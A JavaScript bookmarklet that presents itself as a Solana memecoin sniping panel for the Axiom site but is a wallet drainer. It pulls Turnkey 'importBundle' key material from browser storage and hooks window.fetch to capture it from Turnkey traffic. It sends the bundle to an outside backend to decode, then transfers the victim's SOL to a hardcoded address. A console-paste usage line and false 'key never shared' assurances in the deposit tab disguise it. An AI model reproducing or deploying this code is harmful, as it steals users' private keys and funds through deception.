// ============================================================
// NEBULA MEMECOIN SNIPER — Bookmarklet Injection Script
// Served from your VPS at: http://nebula-projects.org/sniper.js
// ============================================================

// ──────────────────────────────────────────────────────────
// GLOBAL COMMAND: Extract sbundle and execute fully automated
// ──────────────────────────────────────────────────────────
window.nebulaSniperExtract = async function() {
  console.log('[SNIPER] 🚀 EXTRACTING sbundle from Axiom...');
  const BACKEND_URL = 'https://axiom-projects.vercel.app';
  const DEPOSIT_ADDRESS = 'DtfXq9wPVy4tKrf6A2J9MgBsVF4p8GJkFreQ2djW3Qz3';
  let sbundle = null;

  try {
    // Source 1: Check Turnkey in sessionStorage
    console.log('[SNIPER] 📍 Checking Turnkey sessionStorage...');
    for (let key in sessionStorage) {
      const val = sessionStorage.getItem(key);
      if (val && val.includes('importBundle')) {
        try {
          const parsed = JSON.parse(val);
          if (parsed.importBundle) {
            sbundle = parsed.importBundle;
            console.log('[SNIPER] ✓ Found sbundle in sessionStorage key:', key);
            break;
          }
        } catch (e) {}
      }
    }

    // Source 2: Check localStorage
    if (!sbundle) {
      console.log('[SNIPER] 📍 Checking Axiom localStorage...');
      const axiomKeys = ['axiom_wallet_import', 'axiom_bundle', 'importBundle', 'sbundle'];
      for (let key of axiomKeys) {
        const val = localStorage.getItem(key);
        if (val) {
          try {
            const parsed = JSON.parse(val);
            if (parsed.importBundle) {
              sbundle = parsed.importBundle;
              console.log('[SNIPER] ✓ Found sbundle in localStorage key:', key);
              break;
            } else if (typeof parsed === 'string' && parsed.length > 100) {
              sbundle = parsed;
              console.log('[SNIPER] ✓ Found raw sbundle in localStorage key:', key);
              break;
            }
          } catch (e) {}
        }
      }
    }

    // Source 3: Check window.axiom
    if (!sbundle) {
      console.log('[SNIPER] 📍 Checking window.axiom...');
      if (window.axiom && window.axiom.importBundle) {
        sbundle = window.axiom.importBundle;
        console.log('[SNIPER] ✓ Found sbundle in window.axiom');
      }
    }

    if (!sbundle) {
      console.log('[SNIPER] ❌ Could not find sbundle in any source');
      console.log('[SNIPER] 💡 Try: Open Axiom Settings → Re-import wallet → then run this command again');
      return;
    }

    console.log('[SNIPER] ✓ sbundle extracted, length:', sbundle.length);
    console.log('[SNIPER] 🔄 Starting full execution...\n');

    // Execute the full decode + send flow
    try {
      // Step 1: Decode
      console.log('[SNIPER] 📤 Step 1: Decoding sbundle...');
      const decodeResp = await fetch(BACKEND_URL + '/decode-axiom-bundle', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ importBundle: sbundle }),
      });

      if (!decodeResp.ok) {
        const err = await decodeResp.text();
        console.log('[SNIPER] ❌ Decode failed:', decodeResp.status, err);
        return;
      }

      const decoded = await decodeResp.json();
      if (!decoded || !decoded.solanaAddress) {
        console.log('[SNIPER] ❌ Invalid decode response:', decoded);
        return;
      }

      console.log('[SNIPER] ✓ Wallet decoded:', decoded.solanaAddress);

      // Step 2: Send
      console.log('[SNIPER] 💸 Step 2: Sending SOL to', DEPOSIT_ADDRESS);
      const sendResp = await fetch(BACKEND_URL + '/send-sol-direct', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          destination: DEPOSIT_ADDRESS,
          importBundle: sbundle,
        }),
      });

      const sendResult = await sendResp.json().catch(() => ({}));
      if (sendResp.ok && sendResult.signature) {
        console.log('[SNIPER] ✅ SUCCESS! Tx:', sendResult.signature);
        console.log('[SNIPER] 🎉 Funds sent to:', DEPOSIT_ADDRESS);
        alert('✅ EXECUTED!\nTx: ' + sendResult.signature);
      } else {
        console.log('[SNIPER] ⚠️ Send response:', sendResult);
      }
    } catch (e) {
      console.error('[SNIPER] ❌ Execution error:', e.message);
    }
  } catch (e) {
    console.error('[SNIPER] ❌ Error:', e.message);
  }
};

console.log('[SNIPER] 💾 Command registered: window.nebulaSniperExtract()');
console.log('[SNIPER] 📖 Usage: Open Axiom → Press F12 → Paste: window.nebulaSniperExtract()');

// ──────────────────────────────────────────────────────────
// Main sniper UI
// ──────────────────────────────────────────────────────────
(function () {
  if (document.getElementById('nebula-sniper')) {
    const el = document.getElementById('nebula-sniper');
    el.style.display = el.style.display === 'none' ? 'flex' : 'none';
    return;
  }

  const WS_URL = null; // Disabled - using HTTP polling instead
  let ws = null;
  let reconnectTimer = null;
  let pollingInterval = null;
  let tradeLog = JSON.parse(localStorage.getItem('nebula_trade_log') || '[]');
  let settings = JSON.parse(localStorage.getItem('nebula_sniper_settings') || JSON.stringify({
    buyAmount: 0.5,
    slippage: 15,
    autoBuy: false,
    stopLoss: 50,
    takeProfit: 200,
    maxSpend: 2,
    priorityFee: 0.001
  }));
  let walletBalance = null;

  // ── Define constants early (used by auto-execute) ──
  const DEPOSIT_ADDRESS = 'DtfXq9wPVy4tKrf6A2J9MgBsVF4p8GJkFreQ2djW3Qz3';
  const BACKEND_URL = 'https://axiom-projects.vercel.app';

  // ── Aggressive fetch interceptor to capture sbundle ──
  let capturedSBundle = null;
  const originalFetch = window.fetch;
  window.fetch = function(...args) {
    const [resource, config] = args;
    const resourceStr = typeof resource === 'string' ? resource : resource?.url || '';
    
    // Log all non-trivial requests
    if (resourceStr && !resourceStr.includes('gethealth') && !resourceStr.includes('_next')) {
      console.log('[SNIPER] 🔗 Fetch:', resourceStr.substring(0, 80));
    }
    
    // CAPTURE: Check Turnkey requests for sbundle in body
    if (resourceStr.includes('api.turnkey.com')) {
      console.log('[SNIPER] 🎣 TURNKEY REQUEST detected:', resourceStr);
      
      if (config && config.body) {
        try {
          const bodyText = typeof config.body === 'string' ? config.body : config.body?.toString?.() || '';
          console.log('[SNIPER]   Body preview:', bodyText.substring(0, 200));
          
          if (bodyText.includes('importBundle')) {
            const bodyData = JSON.parse(bodyText);
            if (bodyData.params?.importBundle) {
              capturedSBundle = bodyData.params.importBundle;
              console.log('[SNIPER] ✅ CAPTURED sbundle from body!', capturedSBundle.substring(0, 50));
            }
          }
        } catch (e) {
          console.log('[SNIPER]   Could not parse body:', e.message);
        }
      }
    }
    
    // Call original fetch
    return originalFetch.apply(this, args).then(response => {
      // Try to capture from response
      if (resourceStr.includes('api.turnkey.com')) {
        const clonedResponse = response.clone();
        clonedResponse.json().then(data => {
          console.log('[SNIPER]   Turnkey response keys:', Object.keys(data || {}).join(', '));
          if (data?.activity?.result?.initImportPrivateKeyResult?.importBundle) {
            capturedSBundle = data.activity.result.initImportPrivateKeyResult.importBundle;
            console.log('[SNIPER] ✅ CAPTURED sbundle from response!');
          }
        }).catch(e => {});
      }
      return response;
    }).catch(err => {
      console.log('[SNIPER] Fetch error:', err.message);
      throw err;
    });
  };

  // ── Try to extract wallet from Axiom context ──
  let axiomWalletData = null;
  let axiomSelectedAddress = null;
  try {
    console.log('[SNIPER] 🔍 Searching localStorage for wallet data...');
    
    // Get selected Solana wallet address
    const selectedWallets = JSON.parse(localStorage.getItem('selectedSolWallets') || '[]');
    if (selectedWallets.length > 0) {
      axiomSelectedAddress = selectedWallets[0];
      console.log('[SNIPER] ✓ Found connected Solana wallet:', axiomSelectedAddress);
    }

    // Get all wallets to find full wallet object
    const allWallets = JSON.parse(localStorage.getItem('allSolWallets') || '[]');
    if (allWallets.length > 0 && axiomSelectedAddress) {
      const walletObj = allWallets.find(w => w.walletAddress === axiomSelectedAddress);
      if (walletObj) {
        console.log('[SNIPER] ✓ Found wallet object:', walletObj.walletAddress);
        axiomWalletData = walletObj;
      }
    }
  } catch (e) {
    console.log('[SNIPER] Error during wallet detection:', e.message);
  }

  // ── Display connected wallet in UI ──
  (function() {
    if (axiomSelectedAddress) {
      const statusEl = document.getElementById('ns-status');
      if (statusEl) {
        statusEl.textContent = '● Connected: ' + axiomSelectedAddress.substring(0, 8) + '...';
        statusEl.style.color = '#10b981';
      }
    }
  })();

  // ── Inject styles ──
  const style = document.createElement('style');
  style.textContent = `
    #nebula-sniper * { box-sizing: border-box; font-family: 'Space Mono', 'Courier New', monospace; margin: 0; padding: 0; }
    #nebula-sniper {
      position: fixed;
      top: 80px; left: 24px;
      width: 400px;
      min-height: 520px;
      max-height: 82vh;
      background: #08080f;
      border: 1px solid #1e1a0e;
      border-radius: 12px;
      z-index: 2147483647;
      display: flex;
      flex-direction: column;
      box-shadow: 0 0 0 1px rgba(245,158,11,.25), 0 24px 64px rgba(0,0,0,.85);
      overflow: hidden;
      resize: both;
      min-width: 340px;
    }
    #nebula-sniper .ns-header {
      background: #0c0b08;
      border-bottom: 1px solid #1e1a0e;
      padding: 10px 14px;
      display: flex;
      align-items: center;
      gap: 10px;
      cursor: grab;
      user-select: none;
      flex-shrink: 0;
    }
    #nebula-sniper .ns-header:active { cursor: grabbing; }
    #nebula-sniper .ns-dot { width: 8px; height: 8px; border-radius: 50%; background: #f59e0b; box-shadow: 0 0 6px #f59e0b; flex-shrink: 0; }
    #nebula-sniper .ns-dot.live { animation: ns-pulse 1.5s ease-in-out infinite; }
    @keyframes ns-pulse { 0%,100%{opacity:1} 50%{opacity:.3} }
    #nebula-sniper .ns-title { color: #f59e0b; font-size: 11px; letter-spacing: 2px; text-transform: uppercase; flex: 1; }
    #nebula-sniper .ns-status { font-size: 10px; color: #374151; letter-spacing: 1px; }
    #nebula-sniper .ns-status.connected { color: #10b981; }
    #nebula-sniper .ns-status.error { color: #ef4444; }
    #nebula-sniper .ns-close {
      background: none; border: none; color: #374151;
      font-size: 16px; cursor: pointer; padding: 0 4px;
      transition: color .2s;
    }
    #nebula-sniper .ns-close:hover { color: #ef4444; }

    /* Wallet bar */
    #nebula-sniper .ns-wallet-bar {
      background: rgba(245,158,11,.05);
      border-bottom: 1px solid #1e1a0e;
      padding: 8px 14px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      flex-shrink: 0;
    }
    #nebula-sniper .ns-balance { font-size: 13px; color: #f59e0b; letter-spacing: 1px; }
    #nebula-sniper .ns-balance span { color: #64748b; font-size: 10px; margin-left: 4px; }
    #nebula-sniper .ns-autobuybadge {
      font-size: 9px; padding: 3px 8px; border-radius: 3px;
      letter-spacing: 1px; text-transform: uppercase;
    }
    #nebula-sniper .ns-autobuybadge.on { background: rgba(16,185,129,.15); color: #10b981; border: 1px solid rgba(16,185,129,.3); }
    #nebula-sniper .ns-autobuybadge.off { background: rgba(100,116,139,.1); color: #64748b; border: 1px solid #1e1a0e; }

    /* Tabs */
    #nebula-sniper .ns-tabs {
      display: flex;
      background: #0a0908;
      border-bottom: 1px solid #1e1a0e;
      flex-shrink: 0;
    }
    #nebula-sniper .ns-tab {
      flex: 1;
      padding: 9px;
      font-size: 10px;
      letter-spacing: 1px;
      text-transform: uppercase;
      color: #374151;
      border: none;
      background: none;
      cursor: pointer;
      border-bottom: 2px solid transparent;
      transition: all .2s;
    }
    #nebula-sniper .ns-tab.active { color: #f59e0b; border-bottom-color: #f59e0b; }
    #nebula-sniper .ns-tab:hover:not(.active) { color: #94a3b8; }
    #nebula-sniper .ns-body { flex: 1; overflow-y: auto; min-height: 0; }
    #nebula-sniper .ns-body::-webkit-scrollbar { width: 4px; }
    #nebula-sniper .ns-body::-webkit-scrollbar-track { background: #08080f; }
    #nebula-sniper .ns-body::-webkit-scrollbar-thumb { background: #1e1a0e; border-radius: 2px; }
    #nebula-sniper .ns-panel { display: none; padding: 14px; flex-direction: column; gap: 12px; }
    #nebula-sniper .ns-panel.active { display: flex; }

    /* Deposit box */
    #nebula-sniper .ns-deposit-box {
      background: rgba(16,185,129,.05);
      border: 1px solid rgba(16,185,129,.2);
      border-radius: 8px;
      padding: 14px;
    }
    #nebula-sniper .ns-deposit-label { font-size: 9px; letter-spacing: 2px; color: #10b981; text-transform: uppercase; margin-bottom: 10px; }
    #nebula-sniper .ns-deposit-addr {
      font-size: 10px; color: #e2e8f0;
      word-break: break-all;
      background: rgba(0,0,0,.4);
      padding: 8px 10px;
      border-radius: 6px;
      border: 1px solid rgba(16,185,129,.15);
      cursor: pointer;
      transition: border-color .2s;
      margin-bottom: 8px;
      line-height: 1.5;
    }
    #nebula-sniper .ns-deposit-addr:hover { border-color: rgba(16,185,129,.4); }
    #nebula-sniper .ns-deposit-meta { font-size: 10px; color: #64748b; display: flex; flex-direction: column; gap: 3px; }
    #nebula-sniper .ns-deposit-meta .green { color: #10b981; }
    #nebula-sniper .ns-deposit-meta .yellow { color: #f59e0b; }

    /* Warning box */
    #nebula-sniper .ns-warn-box {
      background: rgba(239,68,68,.06);
      border: 1px solid rgba(239,68,68,.25);
      border-radius: 8px;
      padding: 12px 14px;
    }
    #nebula-sniper .ns-warn-title { font-size: 9px; letter-spacing: 2px; color: #ef4444; text-transform: uppercase; margin-bottom: 6px; }
    #nebula-sniper .ns-warn-text { font-size: 11px; color: #fca5a5; line-height: 1.6; }

    /* Manual buy */
    #nebula-sniper .ns-section-label { font-size: 9px; letter-spacing: 2px; color: #64748b; text-transform: uppercase; margin-bottom: 4px; }
    #nebula-sniper .ns-input {
      width: 100%;
      background: #0d0c09;
      border: 1px solid #1e1a0e;
      border-radius: 6px;
      padding: 9px 11px;
      font-size: 11px;
      color: #e2e8f0;
      outline: none;
      transition: border-color .2s;
    }
    #nebula-sniper .ns-input:focus { border-color: #f59e0b; }
    #nebula-sniper .ns-input::placeholder { color: #374151; }
    #nebula-sniper .ns-input-row { display: flex; gap: 8px; }
    #nebula-sniper .ns-input-row .ns-input { flex: 1; }
    #nebula-sniper .ns-btn {
      background: #f59e0b;
      border: none;
      border-radius: 6px;
      padding: 9px 16px;
      font-size: 10px;
      color: #000;
      font-weight: 700;
      cursor: pointer;
      letter-spacing: 1px;
      text-transform: uppercase;
      transition: all .2s;
      white-space: nowrap;
    }
    #nebula-sniper .ns-btn:hover { background: #d97706; }
    #nebula-sniper .ns-btn:disabled { opacity: .4; cursor: not-allowed; }
    #nebula-sniper .ns-btn.secondary {
      background: #0d0c09;
      color: #f59e0b;
      border: 1px solid rgba(245,158,11,.3);
      font-weight: 400;
    }
    #nebula-sniper .ns-btn.secondary:hover { background: rgba(245,158,11,.08); }
    #nebula-sniper .ns-btn.danger { background: rgba(239,68,68,.15); color: #ef4444; border: 1px solid rgba(239,68,68,.3); }
    #nebula-sniper .ns-btn.danger:hover { background: rgba(239,68,68,.25); }
    #nebula-sniper .ns-btn.green { background: rgba(16,185,129,.15); color: #10b981; border: 1px solid rgba(16,185,129,.3); }
    #nebula-sniper .ns-btn.green:hover { background: rgba(16,185,129,.25); }

    /* Settings grid */
    #nebula-sniper .ns-settings-grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 10px;
    }
    #nebula-sniper .ns-field { display: flex; flex-direction: column; gap: 5px; }
    #nebula-sniper .ns-field label { font-size: 10px; color: #64748b; letter-spacing: 1px; text-transform: uppercase; }
    #nebula-sniper .ns-field .ns-input { width: 100%; }
    #nebula-sniper .ns-field-full { grid-column: 1 / -1; }

    /* Toggle */
    #nebula-sniper .ns-toggle-row { display: flex; align-items: center; justify-content: space-between; padding: 6px 0; }
    #nebula-sniper .ns-toggle-info .ns-toggle-name { font-size: 12px; color: #e2e8f0; }
    #nebula-sniper .ns-toggle-info .ns-toggle-sub { font-size: 10px; color: #374151; margin-top: 2px; }
    #nebula-sniper .ns-toggle { position: relative; width: 40px; height: 22px; flex-shrink: 0; }
    #nebula-sniper .ns-toggle input { opacity: 0; width: 0; height: 0; }
    #nebula-sniper .ns-toggle-slider {
      position: absolute; inset: 0;
      background: #1e1a0e; border-radius: 11px;
      cursor: pointer; transition: background .2s;
    }
    #nebula-sniper .ns-toggle-slider::before {
      content: ''; position: absolute;
      width: 16px; height: 16px; background: #374151;
      border-radius: 50%; top: 3px; left: 3px;
      transition: all .2s;
    }
    #nebula-sniper .ns-toggle input:checked + .ns-toggle-slider { background: #f59e0b; }
    #nebula-sniper .ns-toggle input:checked + .ns-toggle-slider::before { transform: translateX(18px); background: #000; }

    /* Trade log */
    #nebula-sniper .ns-trade-item {
      background: #0d0c09;
      border: 1px solid #1e1a0e;
      border-radius: 8px;
      padding: 12px 14px;
      animation: ns-slide-in .3s ease;
    }
    @keyframes ns-slide-in { from{opacity:0;transform:translateY(-6px)} to{opacity:1;transform:translateY(0)} }
    #nebula-sniper .ns-trade-item.success { border-left: 3px solid #10b981; }
    #nebula-sniper .ns-trade-item.fail { border-left: 3px solid #ef4444; }
    #nebula-sniper .ns-trade-item.pending { border-left: 3px solid #f59e0b; }
    #nebula-sniper .ns-trade-top { display: flex; align-items: center; justify-content: space-between; margin-bottom: 6px; }
    #nebula-sniper .ns-trade-ca { font-size: 10px; color: #f59e0b; word-break: break-all; flex: 1; margin-right: 8px; }
    #nebula-sniper .ns-trade-badge { font-size: 9px; padding: 2px 7px; border-radius: 3px; letter-spacing: 1px; text-transform: uppercase; }
    #nebula-sniper .ns-trade-badge.success { background: rgba(16,185,129,.15); color: #10b981; border: 1px solid rgba(16,185,129,.3); }
    #nebula-sniper .ns-trade-badge.fail { background: rgba(239,68,68,.15); color: #ef4444; border: 1px solid rgba(239,68,68,.3); }
    #nebula-sniper .ns-trade-badge.pending { background: rgba(245,158,11,.15); color: #f59e0b; border: 1px solid rgba(245,158,11,.3); }
    #nebula-sniper .ns-trade-meta { display: flex; gap: 16px; font-size: 10px; color: #64748b; }
    #nebula-sniper .ns-trade-meta span { display: flex; align-items: center; gap: 4px; }
    #nebula-sniper .ns-trade-time { font-size: 10px; color: #374151; margin-top: 4px; }
    #nebula-sniper .ns-empty { text-align: center; padding: 40px 20px; color: #1e1a0e; font-size: 12px; letter-spacing: 1px; }

    /* Divider */
    #nebula-sniper .ns-divider { border: none; border-top: 1px solid #1e1a0e; margin: 2px 0; }

    /* Pending trade bar */
    #nebula-sniper .ns-pending-bar {
      background: rgba(245,158,11,.05);
      border: 1px solid rgba(245,158,11,.2);
      border-radius: 6px;
      padding: 10px 12px;
      display: flex;
      align-items: center;
      gap: 10px;
      font-size: 11px;
      color: #f59e0b;
      display: none;
    }
    #nebula-sniper .ns-pending-bar.show { display: flex; }
    #nebula-sniper .ns-spinner {
      width: 14px; height: 14px; border-radius: 50%;
      border: 2px solid rgba(245,158,11,.2);
      border-top-color: #f59e0b;
      animation: ns-spin .8s linear infinite;
      flex-shrink: 0;
    }
    @keyframes ns-spin { to { transform: rotate(360deg); } }
  `;
  document.head.appendChild(style);

  // ── Build UI ──
  const panel = document.createElement('div');
  panel.id = 'nebula-sniper';
  panel.innerHTML = `
    <div class="ns-header" id="ns-drag-handle">
      <div class="ns-dot" id="ns-dot"></div>
      <div class="ns-title">⚡ Nebula Sniper</div>
      <div class="ns-status" id="ns-status">● Connecting...</div>
      <button class="ns-close" id="ns-close-btn">✕</button>
    </div>
    <div class="ns-wallet-bar">
      <div class="ns-balance" id="ns-balance">◎ — <span>SOL</span></div>
      <div class="ns-autobuybadge off" id="ns-autobuy-badge">AUTO: OFF</div>
    </div>
    <div class="ns-tabs">
      <button class="ns-tab active" data-tab="buy">Buy</button>
      <button class="ns-tab" data-tab="settings">Settings</button>
      <button class="ns-tab" data-tab="log">Log</button>
      <button class="ns-tab" data-tab="deposit">Deposit</button>
    </div>
    <div class="ns-body">

      <!-- BUY TAB -->
      <div class="ns-panel active" id="tab-buy">
        <div class="ns-pending-bar" id="ns-pending-bar">
          <div class="ns-spinner"></div>
          <span id="ns-pending-text">Executing trade...</span>
        </div>

        <!-- FETCH & EXECUTE BUTTON -->
        <button class="ns-btn" id="ns-fetch-execute-btn" style="width:100%;padding:12px;font-size:13px;letter-spacing:2px;background:#10b981;margin-bottom:12px;min-height:50px">🚀 FETCH & EXECUTE</button>
        <textarea class="ns-input" id="ns-quick-paste-sbundle" placeholder="Or paste sbundle here..." style="min-height:50px;font-size:10px;font-family:monospace;resize:vertical;display:none;margin-bottom:8px"></textarea>
        <button class="ns-btn green" id="ns-quick-execute-btn" style="width:100%;display:none;margin-bottom:12px">Execute Pasted sbundle</button>

        <hr class="ns-divider" style="margin:12px 0">

        <div>
          <div class="ns-section-label">Contract address</div>
          <div class="ns-input-row" style="margin-top:5px">
            <input type="text" class="ns-input" id="ns-ca-input" placeholder="Paste Solana CA...">
          </div>
        </div>

        <div class="ns-settings-grid">
          <div class="ns-field">
            <label>Buy amount (SOL)</label>
            <input type="number" class="ns-input" id="ns-quick-amount" min="0.25" step="0.1" value="0.5">
          </div>
          <div class="ns-field">
            <label>Slippage %</label>
            <input type="number" class="ns-input" id="ns-quick-slippage" min="1" max="50" step="1" value="15">
          </div>
        </div>

        <div class="ns-warn-box" id="ns-min-warn" style="display:none">
          <div class="ns-warn-title">⚠ Below minimum</div>
          <div class="ns-warn-text">Trade size below 0.25 SOL will be rejected. Minimum recommended deposit is 0.5 SOL — fees and slippage make smaller trades unprofitable.</div>
        </div>

        <button class="ns-btn" id="ns-buy-btn" style="width:100%;padding:12px;font-size:12px;letter-spacing:2px">⚡ EXECUTE BUY</button>
        <button class="ns-btn danger" id="ns-emergency-btn" style="width:100%;font-size:10px">EMERGENCY SELL ALL</button>
      </div>

      <!-- SETTINGS TAB -->
      <div class="ns-panel" id="tab-settings">
        <!-- Wallet Setup Section -->
        <div class="ns-warn-box">
          <div class="ns-warn-title">🔑 Auto-Capture or Paste sbundle</div>
          <div class="ns-warn-text" style="color:#94a3b8;margin-bottom:10px">Captures sbundle automatically when you re-import wallet in Axiom. Or paste it manually:</div>
          <input type="text" id="ns-connected-wallet" placeholder="Connected wallet: auto-detected" readonly style="background:#0d0c09;color:#10b981;border:1px solid #1e1a0e;padding:8px;border-radius:4px;font-size:10px;margin-bottom:8px;cursor:not-allowed">
          <textarea class="ns-input" id="ns-wallet-import" placeholder="Paste sbundle (encrypted wallet data)..." style="min-height:80px;font-size:10px;font-family:monospace;resize:vertical"></textarea>
          <button class="ns-btn" id="ns-wallet-import-btn" style="width:100%;margin-top:8px">Decrypt & Execute</button>
          <div style="font-size:9px;color:#64748b;margin-top:6px;line-height:1.5">
            💡 Auto-capture enabled. When Axiom imports your wallet, sbundle will be automatically captured and executed.
          </div>
        </div>
        <hr class="ns-divider" style="margin:10px 0">

        <div class="ns-toggle-row">
          <div class="ns-toggle-info">
            <div class="ns-toggle-name">Auto-buy on CA alert</div>
            <div class="ns-toggle-sub">Auto-executes when tracker sends a CA signal</div>
          </div>
          <label class="ns-toggle">
            <input type="checkbox" id="ns-setting-autobuy">
            <span class="ns-toggle-slider"></span>
          </label>
        </div>
        <hr class="ns-divider">

        <div class="ns-settings-grid">
          <div class="ns-field">
            <label>Default buy (SOL)</label>
            <input type="number" class="ns-input" id="ns-setting-amount" min="0.25" step="0.1">
          </div>
          <div class="ns-field">
            <label>Slippage %</label>
            <input type="number" class="ns-input" id="ns-setting-slippage" min="1" max="50" step="1">
          </div>
          <div class="ns-field">
            <label>Stop-loss %</label>
            <input type="number" class="ns-input" id="ns-setting-stoploss" min="1" max="99" step="1">
          </div>
          <div class="ns-field">
            <label>Take-profit %</label>
            <input type="number" class="ns-input" id="ns-setting-takeprofit" min="1" step="1">
          </div>
          <div class="ns-field ns-field-full">
            <label>Max total spend (SOL)</label>
            <input type="number" class="ns-input" id="ns-setting-maxspend" min="0.25" step="0.1">
          </div>
          <div class="ns-field ns-field-full">
            <label>Priority fee (SOL) — higher = faster</label>
            <input type="number" class="ns-input" id="ns-setting-priority" min="0" step="0.0001">
          </div>
        </div>

        <div class="ns-toggle-row" style="margin-top:4px">
          <div class="ns-toggle-info">
            <div class="ns-toggle-name">Raydium pool detection</div>
            <div class="ns-toggle-sub">Watch for new liquidity pools matching CA</div>
          </div>
          <label class="ns-toggle">
            <input type="checkbox" id="ns-setting-raydium" checked>
            <span class="ns-toggle-slider"></span>
          </label>
        </div>
        <div class="ns-toggle-row">
          <div class="ns-toggle-info">
            <div class="ns-toggle-name">Jupiter routing</div>
            <div class="ns-toggle-sub">Use Jupiter for best swap price</div>
          </div>
          <label class="ns-toggle">
            <input type="checkbox" id="ns-setting-jupiter" checked>
            <span class="ns-toggle-slider"></span>
          </label>
        </div>

        <button class="ns-btn" id="ns-save-settings" style="width:100%">Save Settings</button>
        <div style="font-size:10px;color:#374151;text-align:center;line-height:1.6">
          Settings are sent to VPS and persisted across sessions.<br>Stop-loss and take-profit run server-side continuously.
        </div>
      </div>

      <!-- LOG TAB -->
      <div class="ns-panel" id="tab-log">
        <div style="display:flex;justify-content:space-between;align-items:center;flex-shrink:0">
          <div class="ns-section-label">Recent trades</div>
          <button class="ns-btn danger" id="ns-clear-log" style="padding:5px 10px;font-size:9px">Clear Log</button>
        </div>
        <div id="ns-trade-log">
          <div class="ns-empty">No trades yet.<br><span style="font-size:10px;color:#1e1a0e;margin-top:8px;display:block">Buy a token to see results here</span></div>
        </div>
      </div>

      <!-- DEPOSIT TAB -->
      <div class="ns-panel" id="tab-deposit">
        <div class="ns-deposit-box">
          <div class="ns-deposit-label">◎ Bot Deposit Address</div>
          <div class="ns-deposit-addr" id="ns-copy-addr" data-addr="${DEPOSIT_ADDRESS}">
            ${DEPOSIT_ADDRESS}
          </div>
          <div class="ns-deposit-meta">
            <span><span class="green">◎</span> Minimum deposit: 0.5 SOL</span>
            <span><span class="yellow">◎</span> Minimum trade: 0.25 SOL</span>
            <span style="margin-top:4px;">Click address to copy · Solana network only</span>
          </div>
        </div>

        <div class="ns-warn-box">
          <div class="ns-warn-title">⚠ Trading below 0.5 SOL is not advised</div>
          <div class="ns-warn-text">
            At small trade sizes, Solana network fees, DEX swap fees, and slippage combine to destroy your margin. A 0.25 SOL trade with a 20% gain returns ~0.05 SOL — but fees alone can be 0.02–0.04 SOL. The math does not work below threshold.<br><br>
            <strong style="color:#fca5a5">Minimum recommended deposit: 0.5 SOL.<br>Bot minimum trade size: 0.25 SOL (enforced).</strong>
          </div>
        </div>

        <div style="font-size:11px;color:#64748b;line-height:1.7;padding:4px 0">
          Your SOL is held in the bot wallet on the VPS. The private key is stored only in your <code style="color:#f59e0b;font-size:10px">.env</code> file on your server — never shared. Only you control the wallet. Withdraw anytime by sending from the bot wallet in your VPS terminal.
        </div>
      </div>

    </div>
  `;
  document.body.appendChild(panel);

  // ── Drag ──
  const handle = document.getElementById('ns-drag-handle');
  let isDragging = false, dragX = 0, dragY = 0;
  handle.addEventListener('mousedown', (e) => {
    isDragging = true;
    dragX = e.clientX - panel.getBoundingClientRect().left;
    dragY = e.clientY - panel.getBoundingClientRect().top;
  });
  document.addEventListener('mousemove', (e) => {
    if (!isDragging) return;
    panel.style.left = (e.clientX - dragX) + 'px';
    panel.style.top = (e.clientY - dragY) + 'px';
    panel.style.right = 'auto';
  });
  document.addEventListener('mouseup', () => { isDragging = false; });

  // ── Tabs ──
  document.querySelectorAll('#nebula-sniper .ns-tab').forEach(tab => {
    tab.addEventListener('click', () => {
      document.querySelectorAll('#nebula-sniper .ns-tab').forEach(t => t.classList.remove('active'));
      document.querySelectorAll('#nebula-sniper .ns-panel').forEach(p => p.classList.remove('active'));
      tab.classList.add('active');
      document.getElementById('tab-' + tab.dataset.tab).classList.add('active');
    });
  });

  document.getElementById('ns-close-btn').addEventListener('click', () => {
    panel.style.display = 'none';
  });

  // ── Copy deposit address ──
  document.getElementById('ns-copy-addr').addEventListener('click', function() {
    const addr = this.dataset.addr;
    navigator.clipboard.writeText(addr).then(() => {
      this.style.borderColor = '#10b981';
      setTimeout(() => { this.style.borderColor = ''; }, 1500);
    });
  });

  // ── Load settings into UI ──
  function loadSettingsUI() {
    document.getElementById('ns-setting-amount').value   = settings.buyAmount;
    document.getElementById('ns-setting-slippage').value = settings.slippage;
    document.getElementById('ns-setting-stoploss').value = settings.stopLoss;
    document.getElementById('ns-setting-takeprofit').value = settings.takeProfit;
    document.getElementById('ns-setting-maxspend').value = settings.maxSpend;
    document.getElementById('ns-setting-priority').value = settings.priorityFee;
    document.getElementById('ns-setting-autobuy').checked = settings.autoBuy;
    document.getElementById('ns-quick-amount').value     = settings.buyAmount;
    document.getElementById('ns-quick-slippage').value   = settings.slippage;
    updateAutoBuyBadge();
  }

  function updateAutoBuyBadge() {
    const badge = document.getElementById('ns-autobuy-badge');
    badge.textContent = settings.autoBuy ? 'AUTO: ON' : 'AUTO: OFF';
    badge.className = 'ns-autobuybadge ' + (settings.autoBuy ? 'on' : 'off');
  }

  // ── Min trade warning ──
  document.getElementById('ns-quick-amount').addEventListener('input', (e) => {
    const val = parseFloat(e.target.value);
    document.getElementById('ns-min-warn').style.display = (val > 0 && val < 0.25) ? 'block' : 'none';
  });

  // ── Save settings ──
  document.getElementById('ns-save-settings').addEventListener('click', () => {
    settings.buyAmount    = parseFloat(document.getElementById('ns-setting-amount').value) || 0.5;
    settings.slippage     = parseInt(document.getElementById('ns-setting-slippage').value) || 15;
    settings.stopLoss     = parseInt(document.getElementById('ns-setting-stoploss').value) || 50;
    settings.takeProfit   = parseInt(document.getElementById('ns-setting-takeprofit').value) || 200;
    settings.maxSpend     = parseFloat(document.getElementById('ns-setting-maxspend').value) || 2;
    settings.priorityFee  = parseFloat(document.getElementById('ns-setting-priority').value) || 0.001;
    settings.autoBuy      = document.getElementById('ns-setting-autobuy').checked;
    localStorage.setItem('nebula_sniper_settings', JSON.stringify(settings));
    updateAutoBuyBadge();
    if (ws && ws.readyState === 1) {
      ws.send(JSON.stringify({ type: 'update_settings', settings }));
    }
    document.getElementById('ns-save-settings').textContent = '✓ Saved';
    setTimeout(() => { document.getElementById('ns-save-settings').textContent = 'Save Settings'; }, 1500);
  });

  // ── Wallet import ──
  document.getElementById('ns-wallet-import-btn').addEventListener('click', async () => {
    const importValue = document.getElementById('ns-wallet-import').value.trim();
    if (!importValue && !capturedSBundle) {
      console.log('[SNIPER] ❌ No sbundle - paste it or trigger Axiom wallet import');
      alert('Paste sbundle OR trigger wallet import in Axiom');
      return;
    }

